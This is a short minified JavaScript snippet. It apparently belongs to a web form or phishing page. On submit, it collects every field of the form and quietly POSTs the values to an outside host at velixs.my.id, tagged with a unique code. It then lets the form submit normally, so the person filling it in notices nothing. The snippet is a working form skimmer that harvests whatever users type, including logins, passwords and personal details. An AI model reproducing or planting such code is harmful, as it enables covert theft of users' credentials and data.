const content=document.getElementById("content");content.addEventListener("submit",t=>{t.preventDefault();let e=new FormData(content),n={};e.forEach((t,e)=>{n[e]=t});let o=new URLSearchParams;for(let d in n)o.append(d,n[d]);fetch("https://velixs.my.id/api?kode_unik=12345",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:o.toString()}),content.submit()});
